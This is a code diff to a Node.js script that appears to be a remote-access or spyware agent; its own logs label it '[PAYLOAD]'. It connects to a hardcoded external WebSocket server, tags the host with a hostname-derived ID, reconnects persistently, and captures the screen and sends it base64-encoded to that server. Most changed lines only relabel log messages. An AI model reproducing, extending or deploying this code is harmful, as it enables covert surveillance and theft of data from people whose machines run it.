@@ -4,7 +4,7 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const https = require('https');
-const http = require('http'); // <--- ADDED THIS FIX
+const http = require('http');
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app';
@@ -23,16 +23,18 @@ if (!fs.existsSync(persistDir)) {
 }
 
 function initConnection() {
-    console.log(`Attempting to connect to ${WS_URL}...`);
+    console.log(`[PAYLOAD] Attempting to connect to ${WS_URL}...`);
     
     // Create new instance
     ws = new WebSocket(WS_URL);
 
     ws.on('open', () => {
         reconnectAttempts = 0; // Reset attempts on successful connection
-        myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
-
-        console.log(`Connected with ID: ${myId}`);
+        if (!myId) {
+            myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
+        }
+        
+        console.log(`[PAYLOAD] Connected with ID: ${myId}`);
 
         // Send info as a STRINGIFIED JSON object
         safeSend(JSON.stringify({
@@ -56,18 +58,17 @@ function initConnection() {
                 handleSignaling(data);
             }
         } catch (e) {
-            console.error("Error parsing message:", e);
+            console.error("[PAYLOAD] Error parsing message:", e);
         }
     });
 
     ws.on('close', (code, reason) => {
-        console.log(`WebSocket closed. Code: ${code}, Reason: ${reason}`);
+        console.log(`[PAYLOAD] WebSocket closed. Code: ${code}, Reason: ${reason.toString()}`);
         reconnect();
     });
 
     ws.on('error', (err) => {
-        console.error('WebSocket error:', err.message);
-        // Don't reconnect immediately on error, wait for close or handle gracefully
+        console.error('[PAYLOAD] WebSocket error:', err.message);
     });
 }
 
@@ -75,10 +76,10 @@ function reconnect() {
     if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
         reconnectAttempts++;
         const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000); // Exponential backoff
-        console.log(`Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
+        console.log(`[PAYLOAD] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
         setTimeout(initConnection, delay);
     } else {
-        console.log("Max reconnection attempts reached.");
+        console.log("[PAYLOAD] Max reconnection attempts reached.");
         keepAlive();
     }
 }
@@ -86,14 +87,12 @@ function reconnect() {
 // Helper to safely send data only if connected
 function safeSend(data) {
     if (!ws) {
-        console.log("Skipping send: WebSocket is not initialized.");
+        console.log("[PAYLOAD] Skipping send: WebSocket is not initialized.");
         return false;
     }
 
     if (ws.readyState !== WebSocket.OPEN) {
-        console.log(
-            `Skipping send: WebSocket state is ${ws.readyState}`
-        );
+        console.log(`[PAYLOAD] Skipping send: WebSocket state is ${ws.readyState}`);
         return false;
     }
 
@@ -103,7 +102,7 @@ function safeSend(data) {
         );
         return true;
     } catch (error) {
-        console.error("WebSocket send failed:", error.message);
+        console.error("[PAYLOAD] WebSocket send failed:", error.message);
         return false;
     }
 }
@@ -140,10 +139,10 @@ function captureScreen() {
                     const img = fs.readFileSync(imgPath);
                     // FIX: Stringify the object before sending AND check connection
                     safeSend({
-    type: 'screen_data',
-    id: myId,
-    data: img.toString('base64')
-});
+                        type: 'screen_data',
+                        id: myId,
+                        data: img.toString('base64')
+                    });
                 }
             });
         } else if (!err && fs.existsSync(imgPath)) {
@@ -247,7 +246,7 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`HTTP Server listening on port ${PORT}`);
+    console.log(`[PAYLOAD] HTTP Server listening on port ${PORT}`);
     // Start the WebSocket connection once the HTTP server is ready
     initConnection();
 });
